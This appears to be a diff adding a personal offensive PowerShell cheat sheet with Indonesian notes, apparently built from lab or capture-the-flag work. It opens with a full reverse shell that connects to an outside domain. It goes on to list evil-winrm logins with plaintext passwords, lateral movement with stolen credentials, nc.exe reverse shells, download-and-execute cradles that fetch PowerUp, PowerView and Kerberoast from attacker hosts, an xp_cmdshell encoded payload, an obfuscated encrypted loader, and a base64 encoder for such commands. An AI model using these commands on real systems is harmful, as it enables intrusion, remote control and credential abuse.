@@ -1,1 +1,88 @@
 $client = New-Object System.Net.Sockets.TCPClient("s.oocko.com",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+[ --- bikin file dulu
+evil-winrm -i 10.13.37.12 -u teignton\\jay.teignton -p B6rQx_d&RVqvcv2A
+
+echo $user = "teignton\karl.memaybe" > st.ps1
+echo $pass = "B6rQx_d&RVqvcv2A" >> st.ps1
+echo $spass = ConvertTo-SecureString $pass -AsPlainText -Force >> st.ps1
+echo $cred = New-Object System.Management.Automation.PSCredential $user, $spass >> st.ps1
+echo Start-Process "c:\users\public\m3.exe" -WindowStyle Hidden -Credential $cred >> st.ps1
+
+echo Invoke-Command -ScriptBlock {c:\users\public\m3.exe} -Credential $cred -computername WEB >> st.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File st.ps1
+kalo windows 2012 r2 cukup -Noprofile ga usah pake -Exec Bypass
+--
+$user = "datacenter\user_service"; 
+$spass = ConvertTo-SecureString "Password.1" -AsPlainText -Force; 
+$cred = New-Object System.Management.Automation.PSCredential ($user, $spass)
+
+Invoke-Command -ComputerName datacenter -Credential $cred -ScriptBlock { whoami }
+Invoke-Command -ComputerName datacenter -Credential $cred -ScriptBlock { C:\share\nc.exe -e cmd.exe 192.168.181.138 443 }
+
+(New-Object System.Net.WebClient).DownloadFile("http://192.168.22.31/nc.exe", "C:\Users\Public\nc.exe")
+echo $user = "teignton\jay.teignton" > st.ps1
+echo $pass = "B6rQx_d&RVqvcv2A" >> st.ps1
+
+$user = "teignton\jay.teignton";
+$spass = ConvertTo-SecureString "B6rQx_d&RVqvcv2A" -AsPlainText -Force; 
+$cred = New-Object System.Management.Automation.PSCredential ($user, $spass)
+$c = "WEB"
+[System.Diagnostics.Process]::Start("C:\users\public\m3.exe", $cred.user, $cred.spass, $c)
+
+$user = "teignton\jay.teignton";
+$spass = ConvertTo-SecureString "B6rQx_d&RVqvcv2A" -AsPlainText -Force; 
+$cred = New-Object System.Management.Automation.PSCredential ($user, $spass)
+Start-Job -scriptblock { IEX(New-Object Net.WebClient).downloadString('http://10.13.14.11/rev1.ps1') } -Credential $cred | Wait-Job | Receive-Job
+
+#kalau invoke-command gagal coba pake start process
+echo Start-Process "c:\share\nc.exe" -WindowStyle Hidden -ArgumentList "-e cmd.exe 192.168.181.138 443" -Credential $cred >> st.ps1
+
+#bisa pake enter-pssession
+echo Enter-PSSession -ComputerName localhost -Credential $cred >> st.ps1
+
+--
+
+#oneliner
+$user = 'caroline'; $pass = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential $user, $pass; Invoke-Command -ComputerName 192.168.17.231 -Credential $cred -ScriptBlock { whoami }
+
+[ --- 64 bit
+%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1');Invoke-Allchecks"
+
+[ --- remote
+powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).downloadString('http://10.13.14.12/krb.ps1');Invoke-Kerberoast"
+
+powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).downloadString('http://10.10.15.195/Recon/PowerView.ps1');Invoke-ACLScanner"
+
+powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.114/Sherlock.ps1')"
+
+[ --- local
+powershell -execution bypass -Command "& { import-module .\powerview.ps1; Invoke-ACLScanner }"
+powershell -execution bypass -Command "& { import-module .\PowerUp.ps1; Invoke-AllChecks }"
+
+[ -- switch from cmd to ps
+C:\Users\svc-alfresco\pictures>powershell -nop -w 1
+
+PS C:\Users\svc-alfresco\pictures>
+
+
+[ --- download
+Invoke-WebRequest -Uri "http://10.10.14.114/m_443.exe" -OutFile "C:\users\public\m_443.exe"
+
+echo IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.112/Sherlock.ps1"); | powershell -noprofile -
+
+EXEC master.xp_cmdshell 'powershell.exe -NoP -sta -NonI -W Hidden -Enc <<base64_payload>>
+
+&( $SheLliD[1]+$sHELLiD[13]+'x')(( [rUNTIME.iNTerOpseRvices.mArShAl]::ptrToSTRInGuNi( [ruNTIme.InteROpSERViCES.MaRShal]::sECuREStRiNGtOGlobAlAllOcUnIcode($('76492d1116743f0423413b16050a5345MgB8AEEAQwAwAGYAZwBSADYAVQB5ADYAYQBNAFIAaQBGADMAMABhAE0AZgAyAFEAPQA9AHwANwBmADUAMgA3AGYANQBjADAANgBkADUAMwAxADMAYQA3AGIAMAAyADgAZgA4AGIAMQAwAGUAYQBiADIAZgBmAGUAYwA4ADUAOQAxAGYANAAzAGMAYwBhAGMANABiAGEAMAA0AGMANQBmADUANwA0ADcAMgBjADUAZAAzADIAYwAwAGUANgAyAGMAMwBmADEAMwBjADkANgAwADEAOAA5AGUAYwAyAGUAMQA4ADQAMQAzADUAZQBjAGUAMwA0ADIAZQBkADQAMwA1ADAAZQAwADMANQA2ADUAYwBiADIAMQA2AGEAYwAzADUAZABkADgAMQBmADQANwA2AGEAMgBlADEAOAA3ADQAZQAwAGIAZAA4ADEAMwBiADUAOAAyADcAYwBjAGMAOQAzADgAMQA5ADkAMwA3ADgAZABiADIAOQBiAGMAZAA4ADIANQBkAGIANQA4AGQANgA0AGEAOQBiADgANQA5ADEAMQBiAGIAOQA2AGMAZAAzADgAZgAwADkANwBiADIAYwBkAGMAZQBjAGYAYgAxAGIAOAA1ADMAMAA0ADMAYgBiADQAYQAyADcAOAAyADYAZABiAGYAZgBkADcAMgBhADUAMQA2AGUAZAAwADAANQBlADYANgA1ADAAOQA1ADAAMwBjADAAZAAxADEAYQAzADYAZABiAGYAZgA5AGYAOQBmADMAOAA3ADEAMgAyAGIAZABmADAAMwBjAGIAMgAyAGUAMgAyADQAYwA2AGYAZQAyAGQANAA4AGUAOQA1AGQAMwBkADUAMQBkAGIANQAxADEAZgBmADcAOQBiADQANwBjAGIAMQA4AGEAMgA0ADMANgAyADMANQBlAGEAYgAwADcANwA3AGIAMABjADMAMgBkADQAZQBkAGIAMQAzADQAMwA5ADIAMQA3ADUAMQBhADcAOABiAGUAOAA=' | coNVeRTTO-secUrEstRing  -kE  122,111,173,150,12,180,202,236,50,95,18,9,88,229,140,172,142,92,144,233,16,20,90,176)) ) ))
+
+[ --- encode
+$Command = "IEX(New-Object Net.WebClient).downloadString('http://192.168.2.27/ni.ps1')"
+$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Command))
+Write-Host "Command: " $Command
+
+#show encoded command
+Write-Host "Encoded command: powershell.exe -execution bypass -encoded " $Encoded
+
+[ -- duclicate powershell session
+Start-Process powershell -ArgumentList "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.41/ni.ps1')" -WindowStyle Hidden
+Start-Job -scriptblock {IEX(New-Object Net.WebClient).downloadString('http://10.10.14.41/ni.ps1')}
